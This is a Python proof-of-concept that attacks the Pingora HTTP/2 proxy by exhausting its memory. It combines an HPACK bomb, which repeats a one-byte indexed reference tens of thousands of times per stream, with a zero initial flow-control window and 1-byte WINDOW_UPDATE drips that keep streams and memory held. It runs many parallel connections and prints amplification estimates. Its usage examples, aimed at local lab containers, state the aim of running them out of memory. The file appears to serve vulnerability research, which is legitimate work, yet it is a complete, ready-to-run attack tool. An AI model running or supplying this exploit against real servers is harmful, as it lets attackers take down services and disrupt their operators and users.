#!/usr/bin/env python3
"""
Pingora HPACK Bomb + HTTP/2 Window Stall

This is the nginx hpack_poc adapted to Pingora:
  - insert one HPACK dynamic-table entry: ("a", "")
  - repeat indexed reference 0xbe, one byte per decoded header
  - set SETTINGS_INITIAL_WINDOW_SIZE=0
  - drip 1-byte WINDOW_UPDATE frames to keep streams parked

The lab speaks h2c by default. Use --tls for an HTTPS endpoint that negotiates
ALPN h2.
"""
import argparse
import socket
import ssl
import struct
import sys
import threading
import time

H2_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

FRAME_DATA = 0x0
FRAME_HEADERS = 0x1
FRAME_RST_STREAM = 0x3
FRAME_SETTINGS = 0x4
FRAME_PING = 0x6
FRAME_GOAWAY = 0x7
FRAME_WINDOW_UPDATE = 0x8
FRAME_CONTINUATION = 0x9

FLAG_END_STREAM = 0x1
FLAG_ACK = 0x1
FLAG_END_HEADERS = 0x4

SETTINGS_ENABLE_PUSH = 0x2
SETTINGS_INITIAL_WINDOW_SIZE = 0x4

MAX_FRAME_SIZE = 16384


def frame(ftype, flags, stream_id, payload=b""):
    hdr = struct.pack("!I", len(payload))[1:]
    hdr += struct.pack("!BB", ftype, flags)
    hdr += struct.pack("!I", stream_id & 0x7FFFFFFF)
    return hdr + payload


def settings_frame(params, ack=False):
    if ack:
        return frame(FRAME_SETTINGS, FLAG_ACK, 0, b"")
    payload = b"".join(struct.pack("!HI", pid, val) for pid, val in params)
    return frame(FRAME_SETTINGS, 0, 0, payload)


def window_update_frame(stream_id, increment):
    return frame(FRAME_WINDOW_UPDATE, 0, stream_id, struct.pack("!I", increment))


def ping_ack_frame(payload):
    return frame(FRAME_PING, FLAG_ACK, 0, payload)


def parse_frames(data):
    out = []
    off = 0
    while len(data) - off >= 9:
        length = int.from_bytes(data[off : off + 3], "big")
        if len(data) - off < 9 + length:
            break
        ftype = data[off + 3]
        flags = data[off + 4]
        sid = struct.unpack("!I", data[off + 5 : off + 9])[0] & 0x7FFFFFFF
        payload = data[off + 9 : off + 9 + length]
        out.append((ftype, flags, sid, payload))
        off += 9 + length
    return out


def build_hpack_bomb(num_headers):
    """
    Build the original hpack_poc-style header block.

    Header block:
      0x82                :method: GET
      0x84                :path: /
      0x86                :scheme: http
      0x41 0x01 "x"      :authority: x, indexed
      0x40 0x01 "a" 0x00 literal with indexing, new name "a", empty value
      0xbe ...            indexed references to newest dynamic entry ("a", "")

    Each 0xbe is one wire byte. Rust h2 accounts it as 1 + 0 + 32 = 33
    decoded header-list bytes.
    """
    block = bytearray()
    block.append(0x80 | 2)       # :method GET
    block.append(0x80 | 4)       # :path /
    block.append(0x80 | 6)       # :scheme http
    block.append(0x41)           # literal with indexing, name index 1 (:authority)
    block.append(0x01)
    block.append(ord("x"))
    block.append(0x40)           # literal with indexing, new name
    block.append(0x01)
    block.append(ord("a"))
    block.append(0x00)
    block.extend(b"\xbe" * max(0, num_headers - 5))
    return bytes(block)


def split_into_frames(stream_id, header_block, max_payload=MAX_FRAME_SIZE):
    frames = []
    off = 0
    first = True
    while off < len(header_block):
        chunk = header_block[off : off + max_payload]
        off += len(chunk)
        is_last = off >= len(header_block)
        if first:
            flags = FLAG_END_STREAM
            if is_last:
                flags |= FLAG_END_HEADERS
            frames.append(frame(FRAME_HEADERS, flags, stream_id, chunk))
            first = False
        else:
            frames.append(frame(FRAME_CONTINUATION, FLAG_END_HEADERS if is_last else 0, stream_id, chunk))
    return frames


class H2Attack:
    def __init__(self, args, conn_id):
        self.args = args
        self.conn_id = conn_id
        self.sock = None
        self.stream_ids = []
        self.active = False
        self.resets = 0
        self.goaways = 0

    def log(self, msg):
        if self.args.verbose:
            print(f"  [conn {self.conn_id}] {msg}", flush=True)

    def connect(self):
        raw = socket.create_connection((self.args.host, self.args.port), timeout=10)
        raw.settimeout(10)
        if self.args.tls:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ctx.set_alpn_protocols(["h2"])
            self.sock = ctx.wrap_socket(raw, server_hostname=self.args.host)
            negotiated = self.sock.selected_alpn_protocol()
            if negotiated != "h2":
                raise RuntimeError(f"ALPN negotiated {negotiated!r}, expected 'h2'")
        else:
            self.sock = raw
        self.log("connected")

    def handshake(self):
        self.sock.sendall(H2_PREFACE)
        self.sock.sendall(settings_frame([
            (SETTINGS_ENABLE_PUSH, 0),
            (SETTINGS_INITIAL_WINDOW_SIZE, 0),
        ]))
        self._drain(timeout=1.0)
        self.sock.sendall(settings_frame([], ack=True))
        self.log("h2 handshake done (INITIAL_WINDOW_SIZE=0)")

    def send_bombs(self):
        hpack_block = build_hpack_bomb(self.args.headers)
        total_wire = 0
        for i in range(self.args.streams):
            sid = 2 * i + 1
            self.stream_ids.append(sid)
            for f in split_into_frames(sid, hpack_block):
                self.sock.sendall(f)
                total_wire += len(f)
        self.active = True
        self._drain(timeout=1.0)
        return total_wire

    def hold_with_drip(self):
        deadline = time.monotonic() + self.args.hold
        drips = 0
        while time.monotonic() < deadline:
            wait_until = min(deadline, time.monotonic() + self.args.drip_interval)
            while time.monotonic() < wait_until:
                if not self.active:
                    return
                self._drain(timeout=min(5.0, wait_until - time.monotonic()))
            if time.monotonic() >= deadline or not self.active:
                break
            try:
                self.sock.sendall(window_update_frame(0, 1))
                for sid in self.stream_ids:
                    self.sock.sendall(window_update_frame(sid, 1))
                drips += 1
                self.log(f"drip #{drips} for {len(self.stream_ids)} streams")
            except OSError:
                self.active = False
                return

    def _drain(self, timeout=1.0):
        self.sock.settimeout(timeout)
        try:
            while True:
                data = self.sock.recv(65536)
                if not data:
                    self.active = False
                    return
                for ftype, flags, sid, payload in parse_frames(data):
                    if ftype == FRAME_PING and not (flags & FLAG_ACK):
                        self.sock.sendall(ping_ack_frame(payload))
                    elif ftype == FRAME_GOAWAY:
                        self.goaways += 1
                        self.active = False
                        self.log("received GOAWAY")
                        return
                    elif ftype == FRAME_RST_STREAM:
                        self.resets += 1
        except (socket.timeout, ssl.SSLWantReadError, BlockingIOError):
            pass
        except OSError:
            self.active = False

    def close(self):
        if self.sock:
            try:
                self.sock.close()
            except OSError:
                pass


def run_attack(args):
    total_streams = args.connections * args.streams
    block = build_hpack_bomb(args.headers)
    wire_per_stream = len(block)
    h2_accounted = args.headers * 33
    # Local Pingora Docker measurement: 64 streams x 32,000 headers OOMed a
    # 120 MiB container, so 1.9 MiB/stream is a conservative display model.
    rss_per_stream = args.headers * (1.9 * 1024 * 1024 / 32000.0)
    total_wire = total_streams * wire_per_stream
    total_rss = total_streams * rss_per_stream

    print(f"\n{'=' * 70}")
    print("  Pingora HPACK Bomb + Window Stall PoC")
    print(f"  Target:      {'https' if args.tls else 'h2c'}://{args.host}:{args.port}")
    print(f"  Connections: {args.connections}")
    print(f"  Streams:     {args.streams} per connection")
    print(f"  Headers:     {args.headers:,} per stream")
    print(f"  Hold:        {args.hold}s (drip every {args.drip_interval}s)")
    print(f"{'=' * 70}")
    print("\n  Estimated Pingora memory:")
    print(f"    h2 decoded header-list: {h2_accounted / 1024 / 1024:.1f} MiB per stream")
    print(f"    observed RSS model:     {rss_per_stream / 1024 / 1024:.1f} MiB per stream")
    print(f"    total RSS estimate:     {total_rss / 1024 / 1024:.0f} MiB ({total_rss / 1024 / 1024 / 1024:.1f} GiB)")
    print(f"    Wire upload:            {total_wire / 1024 / 1024:.1f} MiB")
    print(f"    Amplification:          {total_rss / max(total_wire, 1):.0f}:1")
    print()

    connections = []
    total_sent = 0
    lock = threading.Lock()
    t0 = time.monotonic()

    print(f"[*] Phase 1a: Establishing {args.connections} connections...")

    def connect_worker(i):
        c = H2Attack(args, i)
        try:
            c.connect()
            c.handshake()
            with lock:
                connections.append(c)
        except Exception as e:
            print(f"    Connection {i}: CONNECT FAILED - {e}", flush=True)
            c.close()

    threads = []
    for i in range(args.connections):
        t = threading.Thread(target=connect_worker, args=(i,), daemon=True)
        t.start()
        threads.append(t)
        time.sleep(0.05)
    for t in threads:
        t.join(timeout=30)

    print(f"    {len(connections)}/{args.connections} connections established in {time.monotonic() - t0:.1f}s")
    if not connections:
        return 1

    print(f"[*] Phase 1b: Sending HPACK bombs on all {len(connections)} connections...")

    def bomb_worker(c):
        nonlocal total_sent
        try:
            sent = c.send_bombs()
            with lock:
                total_sent += sent
            print(f"    Connection {c.conn_id}: sent {sent / 1024 / 1024:.1f} MiB", flush=True)
        except Exception as e:
            print(f"    Connection {c.conn_id}: SEND FAILED - {e}", flush=True)
            c.active = False

    threads = []
    t1 = time.monotonic()
    for c in connections:
        t = threading.Thread(target=bomb_worker, args=(c,), daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join(timeout=120)

    print(f"\n[*] Phase 1 complete: {len(connections)} connections, {total_sent / 1024 / 1024:.1f} MiB uploaded in {time.monotonic() - t1:.1f}s")
    print("[*] Phase 2: Holding server memory with WINDOW_UPDATE drip...")
    print("    Monitor RSS with: docker exec pingora_hpack_lab python3 /poc/monitor_rss.py")
    print()

    threads = []
    for c in connections:
        t = threading.Thread(target=c.hold_with_drip, daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

    active = sum(1 for c in connections if c.active)
    resets = sum(c.resets for c in connections)
    goaways = sum(c.goaways for c in connections)
    print(f"[*] Done. Connections still active: {active}/{len(connections)} resets={resets} goaways={goaways}")
    for c in connections:
        c.close()
    return 0


def main():
    parser = argparse.ArgumentParser(
        description="Pingora HPACK Bomb + HTTP/2 Window Stall - Memory Exhaustion PoC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Original hpack_poc shape: 128 streams x 32,000 tiny headers
  %(prog)s --host 127.0.0.1 --port 6145 --connections 1

  # OOM the 2 GiB lab container
  %(prog)s --host 127.0.0.1 --port 6147 --streams 2048 --headers 32000 --hold 5

  # Large RSS demo against the 6 GiB lab
  %(prog)s --host 127.0.0.1 --port 6145 --streams 2048 --headers 32000 --hold 90
""",
    )
    parser.add_argument("--host", default="127.0.0.1", help="target host")
    parser.add_argument("--port", type=int, default=6145, help="target port")
    parser.add_argument("-n", "--connections", type=int, default=1, help="concurrent connections")
    parser.add_argument("--streams", type=int, default=128, help="streams per connection")
    parser.add_argument("--headers", type=int, default=32000, help="headers per stream")
    parser.add_argument("--hold", type=int, default=120, help="hold time in seconds")
    parser.add_argument("--drip-interval", type=int, default=50, help="seconds between WINDOW_UPDATE drips")
    parser.add_argument("--tls", action="store_true", help="use TLS and require ALPN h2")
    parser.add_argument("-v", "--verbose", action="store_true", help="verbose per-connection output")
    args = parser.parse_args()

    if args.headers > 500000:
        print("Warning: headers is near/above Pingora h2's 16 MiB decoded header-list cap", file=sys.stderr)

    raise SystemExit(run_attack(args))


if __name__ == "__main__":
    main()
